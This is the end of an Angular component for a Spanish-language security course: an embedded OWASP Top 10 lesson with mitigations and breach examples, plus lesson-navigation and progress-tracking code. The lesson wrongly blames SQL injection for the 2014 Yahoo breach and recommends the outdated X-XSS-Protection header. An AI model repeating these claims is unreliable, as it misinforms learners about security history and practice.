      <strong>Mitigación:</strong> aplicar control de acceso a nivel de servidor, verificar permisos en cada solicitud, usar frameworks con gestión centralizada de roles, y nunca confiar en el cliente para la autorización.
      </p>

      <h3>2. Cryptographic Failures (Fallas criptográficas)</h3>
      <p>
      Anteriormente conocida como “Sensitive Data Exposure”. Ocurre cuando datos sensibles no se cifran correctamente, se usan algoritmos débiles o se transmiten sin TLS. Ejemplos:
      </p>
      <ul>
        <li>Contraseñas almacenadas en texto plano o con hash MD5.</li>
        <li>Tráfico HTTP sin HTTPS.</li>
      </ul>
      <p>
      <strong>Mitigación:</strong> usar algoritmos fuertes (AES-256, bcrypt, Argon2), TLS 1.2 o superior, rotación de claves y cifrado de datos en tránsito y en reposo.
      </p>

      <h3>3. Injection (Inyección)</h3>
      <p>
      Engloba inyecciones SQL, NoSQL, LDAP, OS Command, etc. Ocurre cuando datos del usuario se interpretan como parte del código o comando. La inyección SQL es la más conocida y peligrosa: puede exponer, modificar o destruir toda la base de datos.
      </p>
      <p>
      <strong>Mitigación:</strong> usar consultas parametrizadas, validaciones estrictas y escapar adecuadamente caracteres especiales. Nunca concatenar directamente entrada del usuario en comandos.
      </p>

      <h3>4. Insecure Design (Diseño inseguro)</h3>
      <p>
      No se trata de bugs de código, sino de fallas en la lógica del sistema. Por ejemplo:
      </p>
      <ul>
        <li>Un flujo de pago que no valida límites de transacción.</li>
        <li>Una API que asume que los usuarios nunca manipularán parámetros críticos.</li>
      </ul>
      <p>
      <strong>Mitigación:</strong> aplicar “Security by Design”, realizar threat modeling en el diseño, establecer controles de defensa en profundidad y revisiones arquitectónicas de seguridad.
      </p>

      <h3>5. Security Misconfiguration (Configuración de seguridad incorrecta)</h3>
      <p>
      Es la causa más común de vulnerabilidades web. Incluye servidores con configuraciones por defecto, paneles de administración expuestos o cabeceras HTTP ausentes.
      </p>
      <ul>
        <li>Ejemplo: panel de administración Tomcat sin contraseña.</li>
        <li>Ejemplo: cabecera <code>X-Frame-Options</code> faltante que permite clickjacking.</li>
      </ul>
      <p>
      <strong>Mitigación:</strong> automatizar configuraciones seguras, aplicar hardening en servidores y contenedores, revisar periódicamente entornos, y eliminar servicios innecesarios.
      </p>

      <h3>6. Vulnerable and Outdated Components</h3>
      <p>
      Usar librerías, frameworks o dependencias con fallas conocidas. Un solo componente vulnerable puede comprometer toda la aplicación. Ejemplo: versiones viejas de Log4j o jQuery con fallos de XSS.
      </p>
      <p>
      <strong>Mitigación:</strong> mantener inventario de dependencias, usar escáneres de vulnerabilidades (Dependabot, OWASP Dependency-Check), aplicar actualizaciones de seguridad regularmente.
      </p>

      <h3>7. Identification and Authentication Failures</h3>
      <p>
      Antes conocido como “Broken Authentication”. Se refiere a fallas que permiten suplantación de identidad, robo de sesiones o bypass de login. Ejemplos:
      </p>
      <ul>
        <li>Sesiones sin expiración o sin regeneración tras autenticación.</li>
        <li>Tokens JWT sin firma o con algoritmos inseguros.</li>
      </ul>
      <p>
      <strong>Mitigación:</strong> usar frameworks con autenticación segura integrada, gestionar sesiones con cookies HttpOnly y Secure, aplicar MFA y almacenar hashes de contraseñas robustos.
      </p>

      <h3>8. Software and Data Integrity Failures</h3>
      <p>
      Categoría nueva en OWASP 2021. Ocurre cuando se confía en código o datos sin verificar su integridad. Ejemplo: actualización automática desde repositorio remoto sin firma, o uso de objetos serializados manipulables.
      </p>
      <p>
      <strong>Mitigación:</strong> verificar firmas digitales, usar CI/CD seguro, aplicar control de integridad (checksums) y evitar deserialización insegura.
      </p>

      <h3>9. Security Logging and Monitoring Failures</h3>
      <p>
      Sin registro ni monitoreo, los ataques pasan inadvertidos. Las fallas incluyen logs incompletos, sin timestamps, o no revisados. Esto impide detectar SQLi, accesos sospechosos o ataques automatizados.
      </p>
      <p>
      <strong>Mitigación:</strong> generar logs consistentes, centralizados y auditables, usar SIEM (como Splunk, ELK, o Wazuh), y establecer alertas por comportamientos anómalos.
      </p>

      <h3>10. Server-Side Request Forgery (SSRF)</h3>
      <p>
      SSRF ocurre cuando una aplicación permite que el usuario controle una URL o destino que el servidor luego solicita. Esto puede usarse para acceder a recursos internos (por ejemplo, metadatos de nube o APIs internas).
      </p>
      <ul>
        <li>Ejemplo: formulario que permite subir una URL, y el servidor la “descarga” sin validar, pudiendo acceder a <code>http://169.254.169.254</code> (AWS metadata service).</li>
      </ul>
      <p>
      <strong>Mitigación:</strong> validar y restringir URLs (listas blancas), bloquear acceso a redes internas, y usar servicios proxy o sandbox para solicitudes externas.
      </p>

      <h2>Ejemplos Reales de Impacto</h2>
      <ul>
        <li><strong>Equifax (2017):</strong> Vulnerabilidad de inyección (Apache Struts) permitió acceso a datos de 143 millones de personas.</li>
        <li><strong>Yahoo (2014):</strong> SQLi expuso 500 millones de cuentas, derivando en sanciones y pérdida de reputación.</li>
        <li><strong>Capital One (2019):</strong> SSRF permitió a un atacante acceder a buckets S3 con datos sensibles.</li>
      </ul>

      <h2>Errores Comunes</h2>
      <ul>
        <li>Enfocar seguridad solo en la capa de aplicación, ignorando configuración e infraestructura.</li>
        <li>Creer que usar un framework moderno elimina los riesgos automáticamente.</li>
        <li>No priorizar actualizaciones de librerías por miedo a romper compatibilidad.</li>
        <li>No integrar escáneres de vulnerabilidades en el ciclo de desarrollo.</li>
        <li>Ignorar logs o no responder a alertas de seguridad hasta que ya es tarde.</li>
      </ul>

      <h2>Buenas Prácticas Generales</h2>
      <ul>
        <li>Adoptar <strong>DevSecOps</strong>: integrar controles de seguridad en CI/CD (SAST, DAST, SCA).</li>
        <li>Realizar <strong>Threat Modeling</strong> periódico para detectar riesgos de diseño antes de escribir código.</li>
        <li>Actualizar continuamente dependencias, frameworks y motores de base de datos.</li>
        <li>Usar <strong>cheat sheets OWASP</strong> por tipo de vulnerabilidad (SQLi, XSS, Auth, etc.) como guías de referencia práctica.</li>
        <li>Implementar políticas de seguridad en cabeceras HTTP: CSP, X-Frame-Options, X-XSS-Protection, etc.</li>
      </ul>

      <h2>Resumen</h2>
      <p>
      El OWASP Top 10 proporciona una visión priorizada de los riesgos más críticos en aplicaciones web. Aunque la lista cambia con el tiempo, su esencia se mantiene: la mayoría de las brechas ocurren por errores conocidos, mal entendidos o ignorados. Cada categoría representa un área donde se cruzan el diseño, la implementación y la operación. Conocerlas permite a equipos técnicos anticipar vulnerabilidades, a equipos de gestión priorizar esfuerzos y a organizaciones reducir drásticamente su superficie de ataque.
      </p>
      <p>
      Comprender el OWASP Top 10 es el paso esencial para cualquier estrategia de seguridad madura: es la base para construir software resiliente, verificable y alineado con los estándares internacionales de ciberseguridad.
      </p>
      `
    }
  };

  constructor(
    private route: ActivatedRoute,
    private router: Router,
    private lessonProgressService: LessonProgressService
  ) {}

  ngOnInit(): void {
    this.route.params.subscribe(params => {
      const lessonId = params['lessonId'];
      this.loadLesson(lessonId);
    });
  }

  private loadLesson(lessonId: string): void {
    const lesson = this.lessonContent[lessonId];
    if (lesson) {
      this.lessonData = lesson;
      this.calculateStepPosition(lessonId, lesson.category);
      this.updateNavigationState();

      // Track lesson view via backend
      this.trackLessonView(lessonId);
      
      // Check if lesson is completed
      this.checkLessonCompletion(lessonId);
      
      // Initialize section completion tracking
      setTimeout(() => {
        this.initializeSectionTracking(lessonId);
      }, 100);
    } else {
      this.router.navigate(['/dashboard/theory/syllabus']);
    }
  }

  private trackLessonView(lessonId: string): void {
    // Mark lesson as viewed via backend
    this.lessonProgressService.markLessonViewed(lessonId).subscribe({
      next: () => {
        // Lesson marked as viewed
      },
      error: () => {
        // Non-critical error, continue showing lesson
      }
    });
  }

  private checkLessonCompletion(lessonId: string): void {
    // Check if lesson is already completed from the service
    // First check synchronously
    this.isLessonCompleted = this.lessonProgressService.isLessonCompleted(lessonId);
    
    // Also subscribe to completed lessons changes for real-time updates
    this.lessonProgressService.completedLessons$.subscribe({
      next: (completedLessons) => {
        this.isLessonCompleted = completedLessons.includes(lessonId);
      }
    });
  }

  markLessonAsComplete(): void {
    // Check if all section buttons have been clicked
    if (this.totalSections > 0 && this.completedSections.size < this.totalSections) {
      alert(`Debes completar todos los pasos (${this.completedSections.size}/${this.totalSections}) antes de marcar la lección como completada.`);
      return;
    }
    
    if (this.isMarkingComplete || this.isLessonCompleted) {
      return;
    }

    this.isMarkingComplete = true;
    const lessonId = this.lessonData.id;

    // Mark lesson as completed via backend
    this.lessonProgressService.markLessonCompleted(lessonId).subscribe({
      next: () => {
        this.isLessonCompleted = true;
        this.isMarkingComplete = false;
        
        // Force refresh of progress stats to update counts across all components
        this.lessonProgressService.getProgressStats().subscribe({
          next: () => {
            // Progress stats refreshed - the count will automatically update
            // when all steps in the category are completed
          },
          error: () => {
            // Error refreshing stats (non-critical)
          }
        });
      },
      error: () => {
        this.isMarkingComplete = false;
        alert('Error al marcar la lección como completada. Por favor, intenta de nuevo.');
      }
    });
  }

  private calculateStepPosition(lessonId: string, category: string): void {
    const categoryLessonsList = this.categoryLessons[category as keyof typeof this.categoryLessons];
    if (categoryLessonsList) {
      this.currentStep = categoryLessonsList.indexOf(lessonId) + 1;
      this.totalSteps = categoryLessonsList.length;
    } else {
      this.currentStep = 1;
      this.totalSteps = 1;
    }
  }

  private updateNavigationState(): void {
    this.hasPreviousLesson = this.currentStep > 1;
    this.hasNextLesson = this.currentStep < this.totalSteps;
  }

  navigateBack(): void {
    this.router.navigate(['/dashboard/theory']);
  }

  navigateToPrevious(): void {
    const currentCategory = this.lessonData.category as keyof typeof this.categoryLessons;
    const categoryLessonsList = this.categoryLessons[currentCategory];
    
    if (categoryLessonsList && this.hasPreviousLesson) {
      const previousLessonId = categoryLessonsList[this.currentStep - 2];
      this.router.navigate(['/dashboard/theory/lesson', previousLessonId]).then(() => {
        window.scrollTo({ top: 0, behavior: 'smooth' });
      });
    } else {
      this.router.navigate(['/dashboard/theory/syllabus']).then(() => {
        window.scrollTo({ top: 0, behavior: 'smooth' });
      });
    }
  }

  navigateToNext(): void {
    const currentCategory = this.lessonData.category as keyof typeof this.categoryLessons;
    const categoryLessonsList = this.categoryLessons[currentCategory];

    if (categoryLessonsList && this.hasNextLesson) {
      const nextLessonId = categoryLessonsList[this.currentStep];
      this.router.navigate(['/dashboard/theory/lesson', nextLessonId]).then(() => {
        window.scrollTo({ top: 0, behavior: 'smooth' });
      });
    } else {
      this.router.navigate(['/dashboard/theory/syllabus']).then(() => {
        window.scrollTo({ top: 0, behavior: 'smooth' });
      });
    }
  }

  navigateToSyllabus(): void {
    this.router.navigate(['/dashboard/theory/syllabus']);
  }

  reloadCurrentLesson(): void {
    // Navigate back to the syllabus page
    this.router.navigate(['/dashboard/theory/syllabus']).then(() => {
      window.scrollTo({ top: 0, behavior: 'smooth' });
    });
  }

  getStepsArray(): number[] {
    return Array.from({ length: this.totalSteps }, (_, i) => i + 1);
  }

  /**
   * Initialize section completion tracking by finding all section buttons in the lesson content
   */
  private initializeSectionTracking(lessonId: string): void {
    // Find all buttons in the lesson content that contain "Marcar este paso como completado"
    const lessonContent = document.querySelector('.lesson-content');
    if (!lessonContent) return;

    // Look for buttons, labels, or clickable elements with the completion text
    this.sectionButtons = lessonContent.querySelectorAll('button, label, [data-step], input[type="checkbox"]');
    
    // Filter to only buttons that are section completion buttons
    const completionButtons: Element[] = [];
    this.sectionButtons.forEach((element) => {
      const text = element.textContent?.toLowerCase() || '';
      if (text.includes('marcar') && text.includes('paso') && text.includes('completado')) {
        completionButtons.push(element);
      }
    });

    this.totalSections = completionButtons.length;
    console.log(`Found ${this.totalSections} section completion buttons in lesson ${lessonId}`);

    // Load previously completed sections from localStorage
    this.loadCompletedSections(lessonId);

    // Add click event listeners to each button
    completionButtons.forEach((button, index) => {
      button.addEventListener('click', (event) => {
        event.preventDefault();
        this.markSectionAsComplete(index, lessonId);
      });

      // Visual update for already completed sections
      if (this.completedSections.has(index)) {
        this.updateSectionButtonState(button, true);
      }
    });
  }

  /**
   * Mark a section as complete
   */
  private markSectionAsComplete(sectionIndex: number, lessonId: string): void {
    if (this.completedSections.has(sectionIndex)) {
      return; // Already completed
    }

    // Add to completed sections
    this.completedSections.add(sectionIndex);

    // Save to localStorage
    this.saveCompletedSections(lessonId);

    // Update button visual state
    const buttons = document.querySelectorAll('.lesson-content button, .lesson-content label');
    let currentIndex = 0;
    buttons.forEach((button) => {
      const text = button.textContent?.toLowerCase() || '';
      if (text.includes('marcar') && text.includes('paso') && text.includes('completado')) {
        if (currentIndex === sectionIndex) {
          this.updateSectionButtonState(button, true);
        }
        currentIndex++;
      }
    });

    console.log(`Section ${sectionIndex + 1}/${this.totalSections} completed`);

    // Check if all sections are now completed
    if (this.completedSections.size === this.totalSections && this.totalSections > 0 && !this.isLessonCompleted) {
      console.log('All sections completed! You can now mark the lesson as complete.');
      alert('¡Felicidades! Has completado todos los pasos de esta lección. Ahora puedes marcar la lección como completada.');
    }
  }

  /**
   * Update visual state of a section button
   */
  private updateSectionButtonState(button: Element, completed: boolean): void {
    if (completed) {
      button.classList.add('section-completed');
      button.setAttribute('disabled', 'true');
      if (button.textContent) {
        button.textContent = '✓ Paso completado';
      }
      (button as HTMLElement).style.backgroundColor = '#10b981';
      (button as HTMLElement).style.color = 'white';
      (button as HTMLElement).style.cursor = 'not-allowed';
    }
  }

  /**
   * Load completed sections from localStorage
   */
  private loadCompletedSections(lessonId: string): void {
    const storageKey = `completedSections-${lessonId}`;
    const stored = localStorage.getItem(storageKey);
    
    if (stored) {
      try {
        const sectionsArray = JSON.parse(stored);
        this.completedSections = new Set(sectionsArray);
        console.log(`Loaded ${this.completedSections.size} completed sections from localStorage`);
      } catch (e) {
        this.completedSections = new Set();
      }
    } else {
      this.completedSections = new Set();
    }
  }

  /**
   * Save completed sections to localStorage
   */
  private saveCompletedSections(lessonId: string): void {
    const storageKey = `completedSections-${lessonId}`;
    const sectionsArray = Array.from(this.completedSections);
    localStorage.setItem(storageKey, JSON.stringify(sectionsArray));
  }

}
